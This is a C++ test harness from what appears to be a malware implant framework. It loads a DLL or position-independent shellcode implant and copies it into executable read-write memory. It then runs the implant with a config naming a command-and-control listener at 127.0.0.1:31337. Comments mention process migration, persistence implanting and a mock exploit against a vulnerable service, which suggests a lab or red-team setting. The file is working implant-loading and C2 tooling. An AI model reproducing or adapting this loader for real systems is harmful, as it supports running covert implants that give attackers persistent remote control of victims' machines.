/*
    TestPayload.cpp

    This is a short program to load a DLL and invoke a function named "Payload" with a test config.
    Use it to test your payload, or individual modules. Change the definition of CONFIG as needed.
*/
#include <iostream>
#include <string>
#include <winsock2.h>
#include <Windows.h>
#include <Psapi.h>
#include "..\shared\Config.h"

#pragma comment(lib, "Ws2_32.lib")

typedef void(*PAYLOADFUNC)(PCONFIG Config);

#define TEST_HOST   0x7f000001                  // hard coded test address for CNC server (127.0.0.1)
// #define TEST_HOST 0xc0a83bf2 //192.168.59.242
#define TEST_PORT   31337                       // hard coded test port for CNC server


/**
 * @brief Run a test DLL payload
 *
 * @param[in] path Path and filename of DLL to load
 *
 * @return Returns true if load and run is successful
 */
bool TestDLLPayload(const char* path, const char* picPath)
{
    unsigned ip = TEST_HOST;
    uint8_t* pip = (uint8_t *) &ip;
    printf("Loading DLL Payload for connection to %u.%u.%u.%u:%lu (%s)\n", pip[3], pip[2], pip[1], pip[0], TEST_PORT, path);

    HMODULE hModule = LoadLibraryA(path);
    if (!hModule)
    {
        printf("LoadLibrary(%s) failed (%u)\n", path, GetLastError());
        return false;
    }

    PAYLOADFUNC Payload = (PAYLOADFUNC)GetProcAddress(hModule, "Payload");
    if (!Payload)
    {
        printf("Unable to locate Payload() function (%u)\n", GetLastError());
        return false;
    }

    // copy PIC Implant version for process migration / persistence implanting
    HANDLE hFile = CreateFileA(picPath, GENERIC_READ | GENERIC_EXECUTE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("CreateFile(%s) failed (%u)\n", path, GetLastError());
        return false;
    }

    DWORD fileSizeHigh = 0;
    unsigned picFileSize = GetFileSize(hFile, &fileSizeHigh);
    if(picFileSize == INVALID_FILE_SIZE)
    {
        printf("GetFileSize() failed (%u)\n", GetLastError());
        return false;
    }

    void* picImplant = VirtualAlloc(NULL, picFileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (Payload == NULL)
    {
        printf("VirtualAlloc() failed (%u)\n", GetLastError());
        CloseHandle(hFile);
        return false;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, picImplant, picFileSize, &bytesRead, NULL))
    {
        printf("ReadFile() failed (%u)\n", GetLastError());
        CloseHandle(hFile);
        return false;
    }

    CloseHandle(hFile);

    /* Test config: (127.0.0.1:31337) */
    CONFIG TestConfig = {
        (uint8_t *) picImplant,
        picFileSize,
        htonl(TEST_HOST),    // Listener IP address
        htons(TEST_PORT),   // Listener port
    };

    Payload(&TestConfig);

    return true;
}


/**
 * @brief Run a test PIC payload
 *
 * @param[in] path Path and filename of DLL to load
 *
 * @return Returns true if load and run is successful
 */
bool TestPICPayload(const char* path)
{
    unsigned ip = TEST_HOST;
    uint8_t* pip = (uint8_t *) &ip;
    printf("Loading PIC Payload for connection to %u.%u.%u.%u:%lu (%s)\n", pip[3], pip[2], pip[1], pip[0], TEST_PORT, path);
    //printf("Loading PIC Payload for connection to 127.0.0.1:31337 (%s)\n", path);

    // Note: Requesting GENERIC_ALL here fails in some situations (non-admin). It appears that Windows is blocking RWX file permissions
    HANDLE hFile = CreateFileA(path, GENERIC_READ | GENERIC_EXECUTE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("CreateFile(%s) failed (%u)\n", path, GetLastError());
        return false;
    }

    DWORD fileSizeHigh = 0;
    unsigned fileSize = GetFileSize(hFile, &fileSizeHigh);
    if(fileSize == INVALID_FILE_SIZE)
    {
        printf("GetFileSize() failed (%u)\n", GetLastError());
        return false;
    }

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_EXECUTE_READ, 0, 0, NULL);
    if (hMapping == NULL)
    {
        printf("CreateFileMapping() failed (%u)\n", GetLastError());
        return false;
    }

    PAYLOADFUNC mapView = (PAYLOADFUNC)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_EXECUTE, 0, 0, 0);
    if (mapView == NULL)
    {
        printf("MapViewOfFile() failed (%u)\n", GetLastError());
        return false;
    }

    // I perform the copy to a VirtualAlloc region to imitate the methodology of VulnService, that way the cleanup process is the same for TestPayload and VulnService/MockExploit
    PAYLOADFUNC Payload = (PAYLOADFUNC) VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (Payload == NULL)
    {
        printf("VirtualAlloc() failed (%u)\n", GetLastError());
        UnmapViewOfFile(mapView);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    memcpy_s(Payload, fileSize, mapView, fileSize);
    UnmapViewOfFile(mapView);

    /* Test config: (127.0.0.1:31337) */
    CONFIG TestConfig = {
        (uint8_t *) Payload,
        fileSize,
        htonl(TEST_HOST),    // Listener IP address
        htons(TEST_PORT),   // Listener port
    };

    // This gets the Imports structure symbol loaded in case I need to debug the PIC
    IMPORTS Dummy = { 0 };
    (void)Dummy;

    // entry is simply the begnning of the code section (Begin() in this case)
    Payload(&TestConfig);

    CloseHandle(hMapping);
    CloseHandle(hFile);

    return true;
}


#include <debugapi.h>
/**
 * @brief This is just an easy place to test things Implant and Config related
 */
void RunTests()
{
    printf("Running Tests...\n");
    // call OutputDebugStringA()
    //  Visible in DbgView
    //      - With or without Debug Print Filter > DEFAULT
    //      - Not necessary to capture Kernel or Global Win32
    //      - If process running in VS Debugger, DbgView does not see it. Must be consumed by VS
    //          Note: Visual Studio can be running, just can't be debugging the process (or maybe not debugging period)
    //

    OutputDebugStringA("DEBUG: ************************************* Test Suite ****************************************\n");
    OutputDebugStringA("[+] OutputDebugStringA() pass\n");

    //IMPORTS Imports;
    //if (!LinkImports(&Imports))
    //{
        //OutputDebugStringA("[!] LinkImports() fail\n");
        //return;
    //}
    //OutputDebugStringA("[+] LinkImports() pass\n");
}

/**
 * @brief Main entry point
 */
int main(int argc, char *argv[])
{
    // LinkImports is declared in PIC implant's .h so it can be shared by DLL implant if desired for easy conversion to pic.
    //  This eliminates the unreferenced symbol warning
    //void* dummy = (void*)LinkImports;
    //(void)dummy;

    if (argc == 2 && _strcmpi(argv[1], "/test") == 0)
    {
        RunTests();
        return 0;
    }
    if (argc < 3)
    {
        printf("Usage: TestPayload /DLL <dll_path> <pic_path> | TestPayload /PIC <pic_path>\n");
        return 1;
    }
    if (_strcmpi(argv[1], "/DLL") == 0)
    {
        return TestDLLPayload(argv[2], argv[3]) ? 0 : 1;
    }
    else if (_strcmpi(argv[1], "/PIC") == 0)
    {
        return TestPICPayload(argv[2]) ? 0 : 1;
    }

    printf("Error: unrecognized flag '%s'\n", argv[1]);
    printf("Usage: TestPayload /DLL <dll_path> | TestPayload /PIC <pic_path>\n");
    return 1;
}
